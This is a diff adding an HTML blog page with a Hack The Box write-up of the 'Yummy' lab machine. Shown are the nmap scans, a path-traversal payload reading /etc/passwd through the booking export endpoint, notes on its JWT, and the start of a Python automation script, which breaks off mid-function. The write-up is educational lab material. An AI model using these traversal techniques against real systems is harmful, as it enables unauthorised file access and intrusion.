@@ -1,0 +1,1280 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<!-- iOS Safari -->
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- Chrome, Firefox OS and Opera Status Bar Color -->
+<meta name="theme-color" content="#FFFFFF">
+<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.11.1/katex.min.css">
+<link rel="stylesheet" type="text/css"
+  href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/themes/prism.min.css">
+<link rel="stylesheet" type="text/css" href="css/SourceSansPro.css">
+<link rel="stylesheet" type="text/css" href="css/theme.css">
+<link rel="stylesheet" type="text/css" href="css/notablog.css">
+<!-- Favicon -->
+
+  <link rel="shortcut icon" href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fe7dae887-ad1b-438b-8674-40f561aa2ea3%2Fnoun-terminal-4364895.svg?table=collection&amp;id=c08d2689-cc7d-4fc6-bbcc-bf7b8739bc9b">
+
+<style>
+  :root {
+    font-size: 20px;
+  }
+</style>
+  <title>HTB Machine — Yummy&nbsp;|&nbsp;C:\Users\ch3ng &gt;_</title>
+  <meta property="og:type" content="blog">
+  <meta property="og:title" content="HTB Machine — Yummy">
+  
+    <meta name="description" content="Yummy feels more CTF-like compared to recent HTB boxes. Foothold involves a rather complex attack chain combining path traversal, JWT forging, SQL injection and multiple cron job abuses. Once on the box, I’ll exploit Mercurial and abuse sudo rights to get a root shell.">
+    <meta property="og:description" content="Yummy feels more CTF-like compared to recent HTB boxes. Foothold involves a rather complex attack chain combining path traversal, JWT forging, SQL injection and multiple cron job abuses. Once on the box, I’ll exploit Mercurial and abuse sudo rights to get a root shell.">
+  
+  
+    <meta property="og:image" content="https://labs.hackthebox.com/storage/avatars/5ca57613886666c4c33ef23876b3f054.png">
+  
+  <style>
+    .DateTagBar {
+      margin-top: 1.0rem;
+    }
+  </style>
+</head>
+
+<body>
+  <nav class="Navbar">
+  <a href="/">
+    <div class="Navbar__Btn">
+      
+        <span><img class="inline-img-icon" src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fe7dae887-ad1b-438b-8674-40f561aa2ea3%2Fnoun-terminal-4364895.svg?table=collection&amp;id=c08d2689-cc7d-4fc6-bbcc-bf7b8739bc9b"></span>&nbsp;
+      
+      <span>Home</span>
+    </div>
+  </a>
+  <span class="Navbar__Delim">&centerdot;</span>
+  <a href="https://github.com/ch3ng625", target="_blank">
+    <div class="Navbar__Btn">
+      <span><img class="inline-img-icon" src="icons/github.svg"></span>&nbsp;
+      <span>GitHub</span>
+    </div>
+  </a>
+  <span class="Navbar__Delim">&centerdot;</span>
+  <a href="https://au.linkedin.com/in/chengw625/", target="_blank">
+    <div class="Navbar__Btn">
+      <span><img class="inline-img-icon" src="icons/linkedin.png"></span>&nbsp;
+      <span>LinkedIn</span>
+    </div>
+  </a>
+  <span class="Navbar__Delim">&centerdot;</span>
+  <a href="https://app.hackthebox.com/profile/786447", target="_blank">
+    <div class="Navbar__Btn">
+      <span><img class="inline-img-icon" src="icons/htb.svg"></span>&nbsp;
+      <span>HackTheBox</span>
+    </div>
+  </a>
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+</nav>
+
+  <header class="Header">
+    
+    <div class="Header__Spacer Header__Spacer--NoCover">
+    </div>
+    
+      <div class="Header__Icon">
+        <span><img class="inline-img-icon" src="https://labs.hackthebox.com/storage/avatars/5ca57613886666c4c33ef23876b3f054.png"></span>
+      </div>
+    
+    <h1 class="Header__Title">HTB Machine — Yummy</h1>
+    
+      <div class="DateTagBar">
+        
+          <span class="DateTagBar__Item DateTagBar__Date">Posted on Sun, Feb 23, 2025</span>
+        
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--blue">
+            <a href="tag/HTB">HTB</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--orange">
+            <a href="tag/Linux">Linux</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--red">
+            <a href="tag/Hard">Hard</a>
+          </span>
+        
+      </div>
+    
+  </header>
+  <article id="https://www.notion.so/1a30b98a88f780c5b0bedaff75426c3a" class="PageRoot"><h3 id="https://www.notion.so/1a30b98a88f7803ba9e2f9c2c2b4c466" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/1a30b98a88f7803ba9e2f9c2c2b4c466"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Summary:</span></span></h3><div id="https://www.notion.so/1a30b98a88f780a78161c3ef3c507181" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Yummy feels more CTF-like compared to recent HTB boxes. Foothold involves a rather complex attack chain combining path traversal, JWT forging, SQL injection and multiple cron job abuses. Once on the box, I’ll exploit Mercurial and abuse sudo rights to get a root shell.</span></span></p></div><div id="https://www.notion.so/1a30b98a88f780b1a34cfbb36e0bc26c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1a30b98a88f780b78fd7cde5b71636fb" class="Divider"></div><h3 id="https://www.notion.so/1a30b98a88f780b8b20df64131c34fe4" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/1a30b98a88f780b8b20df64131c34fe4"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Enumeration:</span></span></h3><div id="https://www.notion.so/1a30b98a88f780568ecadd3d9258b8f8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Nmap:</strong></span></span></p></div><pre id="https://www.notion.so/1a30b98a88f780b1a888f0988e2b44fc" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/yummy]
+└─$</span></mark></span><span class="SemanticString"><span> sudo nmap --min-rate 1000 -p- 10.129.231.153 -oA tcp_all_ports/results             
+
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-18 21:01 ACDT
+Nmap scan report for 10.129.231.153
+Host is up (0.28s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 74.29 seconds
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/yummy]
+└─$</span></mark></span><span class="SemanticString"><span> sudo nmap -A -p 22,80 10.129.231.153 -oA aggressive/tcp
+
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-18 21:09 ACDT
+Nmap scan report for 10.129.231.153
+Host is up (0.28s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 a2:ed:65:77:e9:c4:2f:13:49:19:b0:b8:09:eb:56:36 (ECDSA)
+|_  256 bc:df:25:35:5c:97:24:f2:69:b4:ce:60:17:50:3c:f0 (ED25519)
+80/tcp open  http    Caddy httpd
+|_http-server-header: Caddy
+|_http-title: Did not follow redirect to http://yummy.htb/
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 4.15 (96%), Linux 3.2 - 4.14 (96%), Linux 4.15 - 5.19 (96%), Linux 2.6.32 - 3.10 (96%), Linux 2.6.32 - 3.5 (94%), Linux 2.6.32 - 3.13 (94%), Linux 5.0 (94%), Linux 5.0 - 5.14 (94%), MikroTik RouterOS 6.36 - 6.48 (Linux 3.3.5) (93%), Android 9 - 10 (Linux 4.9 - 4.14) (93%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT       ADDRESS
+1   276.66 ms 10.10.14.1
+2   275.64 ms 10.129.231.153
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 21.96 seconds</span></span></span></code></pre><div id="https://www.notion.so/1a30b98a88f78019bf96fa0d94791b22" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Only web and SSH are open. What’s interesting here is that the server isn’t running Apache or Nginx, but instead something called </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://caddyserver.com/">Caddy</a></span><span class="SemanticString">. The domain name </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">yummy.htb</code></span><span class="SemanticString"> is also identified, which I’ll add to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/etc/hosts</code></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/1a30b98a88f7803a9064e32b3e10ffec" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1a30b98a88f78008993cffdc4050736b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">TCP80 — HTTP:</strong></span></span></p></div><div id="https://www.notion.so/1a30b98a88f78069b6ecc5d8f454f595" class="Image Image--PageWidth"><figure><a href="https://github.com/ch3ng625/blog_images/blob/main/yummy/main_page.png?raw=true"><img src="https://github.com/ch3ng625/blog_images/blob/main/yummy/main_page.png?raw=true" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1a30b98a88f780f88aefd8c8323f6d07" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">yummy.htb</code></span><span class="SemanticString"> is a restaurant. A form is shown when clicking “book a table”.</span></span></p></div><div id="https://www.notion.so/1a30b98a88f7805ba281d7d8881c87f4" class="Image Image--PageWidth"><figure><a href="https://github.com/ch3ng625/blog_images/blob/main/yummy/booking.png?raw=true"><img src="https://github.com/ch3ng625/blog_images/blob/main/yummy/booking.png?raw=true" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1a30b98a88f78059ab1ac53026bb3012" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I can submit the form to reserve a table, but looks like I need an account to manage them.</span></span></p></div><div id="https://www.notion.so/1a30b98a88f780cbb96be600b106a1d3" class="Image Image--PageWidth"><figure><a href="https://github.com/ch3ng625/blog_images/blob/main/yummy/book_success.png?raw=true"><img src="https://github.com/ch3ng625/blog_images/blob/main/yummy/book_success.png?raw=true" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1a30b98a88f7806393e3e54f26171fdb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The app allows user registration, so I’ll register an account and log in. At </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/dashboard</code></span><span class="SemanticString">, I can see all the bookings I’ve made.</span></span></p></div><div id="https://www.notion.so/1a30b98a88f7804d81d4ededbb95e014" class="Image Image--PageWidth"><figure><a href="https://github.com/ch3ng625/blog_images/blob/main/yummy/dashboard.png?raw=true"><img src="https://github.com/ch3ng625/blog_images/blob/main/yummy/dashboard.png?raw=true" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1a30b98a88f780fea4d6d0a10085e6d1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Clicking “save icalendar” results in an </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.ics</code></span><span class="SemanticString"> file download.</span></span></p></div><pre id="https://www.notion.so/1a30b98a88f78052bc92e791c97ae8a7" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/yummy]
+└─$</span></mark></span><span class="SemanticString"><span> cat Yummy_reservation_20250218_113329.ics    
+
+BEGIN:VCALENDAR
+VERSION:2.0
+PRODID:ics.py - http://git.io/lLljaA
+BEGIN:VEVENT
+DESCRIPTION:Email: ch3ng@ch3ng.com\nNumber of People: 5\nMessage: testing
+DTSTART:20250218T000000Z
+SUMMARY:ch3ng
+UID:7e399555-c47e-4404-a109-60c5d39a4765@7e39.org
+END:VEVENT
+END:VCALENDAR</span></span></span></code></pre><div id="https://www.notion.so/1a30b98a88f780afbbe8c002d985ec84" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I see nothing notable in the file, but the download request to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/export/Yummy_reservation_&lt;timestamp&gt;.ics</code></span><span class="SemanticString"> caught my attention. Since the exact filename was used, I suspect the backend server directly uses it to grab the file, making path traversal and local file read possible. I intercepted another download request and changed the path to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/export/../../../../../../etc/passwd</code></span><span class="SemanticString">, and it worked.</span></span></p></div><div id="https://www.notion.so/1a30b98a88f7802caecdded09eeab53e" class="Image Image--PageWidth"><figure><a href="https://github.com/ch3ng625/blog_images/blob/main/yummy/burp_lfi.png?raw=true"><img src="https://github.com/ch3ng625/blog_images/blob/main/yummy/burp_lfi.png?raw=true" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1a30b98a88f78033a197f7b97ee20e4b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Note that this only works with direct interception in Burp, the request would fail if using Burp repeater. The reason for this is that the download request requires a one-time use </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">session</code></span><span class="SemanticString"> cookie, which is obtained from a prior GET request to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/reminder/&lt;id&gt;</code></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/1a30b98a88f780c49216ea21b635fcd3" class="Image Image--PageWidth"><figure><a href="https://github.com/ch3ng625/blog_images/blob/main/yummy/burp_session.png?raw=true"><img src="https://github.com/ch3ng625/blog_images/blob/main/yummy/burp_session.png?raw=true" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1a30b98a88f7801394adfd83cc0c125e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Speaking of cookies, I’ve also decoded </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">X-AUTH-Token</code></span><span class="SemanticString">, which is the main cookie used for authentication. Surprisingly, it contains the RSA modulus (</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">n</code></span><span class="SemanticString">) and exponent (</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">e</code></span><span class="SemanticString">). While these values are considered “public” in RSA encryption, it’s certainly unusual to see it included in a JWT — something worth revisiting later.</span></span></p></div><div id="https://www.notion.so/1a30b98a88f780269b70fc3ba84c56bc" class="Image Image--PageWidth"><figure><a href="https://github.com/ch3ng625/blog_images/blob/main/yummy/jwt_decode.png?raw=true"><img src="https://github.com/ch3ng625/blog_images/blob/main/yummy/jwt_decode.png?raw=true" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1a30b98a88f780ddbfa1c0e08f40e5e1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1a30b98a88f7806b9475caea9d231579" class="Divider"></div><h3 id="https://www.notion.so/1a30b98a88f780918108fc24f279f916" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/1a30b98a88f780918108fc24f279f916"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Exploitation:</span></span></h3><div id="https://www.notion.so/1a30b98a88f78098a326e2990da7af7f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Path Traversal:</strong></span></span></p></div><div id="https://www.notion.so/1a30b98a88f780c9bb3ef8218e0b958e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Since it involves multiple requests, I created the script below to automate the process. It can also be downloaded </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/ch3ng625/CTF-scripts/blob/main/HTB/Yummy/file_read.py">here</a></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/1a30b98a88f7800ab9d8c1305a690487" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token keyword">import</span> os
+<span class="token keyword">import</span> sys
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> json
+<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup
+<span class="token keyword">from</span> colorama <span class="token keyword">import</span> Fore<span class="token punctuation">,</span> Style
+
+base_url <span class="token operator">=</span> <span class="token string">"http://yummy.htb"</span>
+
+<span class="token keyword">def</span> <span class="token function">authenticate</span><span class="token punctuation">(</span>email<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	<span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>BLUE <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"[*] Authenticating..."</span></span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+
+	token <span class="token operator">=</span> login<span class="token punctuation">(</span>email<span class="token punctuation">,</span> password<span class="token punctuation">)</span>
+	<span class="token keyword">if</span> token <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+		<span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>YELLOW <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"[!] Authentication failed. Attempting to register account."</span></span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+		register<span class="token punctuation">(</span>email<span class="token punctuation">,</span> password<span class="token punctuation">)</span>
+		token <span class="token operator">=</span> login<span class="token punctuation">(</span>email<span class="token punctuation">,</span> password<span class="token punctuation">)</span>
+		<span class="token keyword">if</span> token <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+			<span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>RED <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"[-] Authentication failed again."</span></span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+			exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+
+	<span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>GREEN <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"[+] Authentication successful."</span></span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+	<span class="token keyword">return</span> token
+
+<span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span>email<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#POST /login</span>
+	login_url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>base_url<span class="token punctuation">}</span></span><span class="token string">/login"</span></span>
+	data <span class="token operator">=</span> <span class="token punctuation">{</span>
+		<span class="token string">"email"</span><span class="token punctuation">:</span> email<span class="token punctuation">,</span>
+		<span class="token string">"password"</span><span class="token punctuation">:</span> password
+	<span class="token punctuation">}</span>
+
+	<span class="token keyword">try</span><span class="token punctuation">:</span>
+		r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>login_url<span class="token punctuation">,</span> json<span class="token operator">=</span>data<span class="token punctuation">)</span>
+	<span class="token keyword">except</span> requests<span class="token punctuation">.</span>RequestException <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+		<span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>RED <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"[-] Something went wrong."</span></span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+		<span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>RED <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"[-] Error: </span><span class="token interpolation"><span class="token punctuation">{</span>e<span class="token punctuation">}</span></span><span class="token string">"</span></span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+		exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+
+	<span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">401</span><span class="token punctuation">:</span>
+		<span class="token keyword">return</span> <span class="token boolean">None</span>
+
+	<span class="token keyword">elif</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
+		token <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"access_token"</span><span class="token punctuation">]</span>
+		<span class="token keyword">return</span> token
+
+	<span class="token keyword">else</span><span class="token punctuation">:</span>
+		<span class="token comment"># should never happen</span>
+		<span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>RED <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"[-] Unknown error occurred."</span></span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+		exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span>email<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	register_url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>base_url<span class="token punctuation">}</span></span><span class="token string">/register"</span></span>
+	data <span class="token operator">=</span> <span class="token punctuation">{</span>
+		<span class="token string">"email"</span><span class="token punctuation">:</span> email<span class="token punctuation">,</span>
+		<span class="token string">"password"</span><span class="token punctuation">:</span> password
+	<span class="token punctuation">}</span>
+
+	<span class="token keyword">try</span><span class="token punctuation">:</span>
+		r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>register_url<span class="token punctuation">,</span> json<span class="token operator">=</span>data<span class="token punctuation">)</span>
+	<span class="token keyword">except</span> requests<span class="token punctuation">.</span>RequestException <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+		<span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>RED <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"[-] Something went wrong."</span></span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+		<span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>RED <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"[-] Error: </span><span class="token interpolation"><span class="token punctuation">{</span>e<span class="token punctuation">}</span></span><span class="token string">"</span></span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+		exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+
+	<span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">400</span><span class="token punctuation">:</span>
+		<span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>RED <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"[-] Registration failed."</span></span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+		<span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>RED <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"[-] Reason: </span><span class="token interpolation"><span class="token punctuation">{</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'message'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span><span class="token string">"</span></span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+		exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+
+	<span class="token keyword">elif</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">201</span><span class="token punctuation">:</span>
+		<span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>GREEN <span class="token operator">+</span> <span class="token string">"[+] Registration successful."</span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+		<span class="token keyword">return</span> <span class="token boolean">True</span>
+
+	<span class="token keyword">else</span><span class="token punctuation">:</span>
+		<span class="token comment"># should never happen</span>
+		<span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>RED <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"[-] Unknown error occurred."</span></span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+		exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">get_ref</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> email<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	ref <span class="token operator">=</span> find_ref<span class="token punctuation">(</span>token<span class="token punctuation">)</span>
+
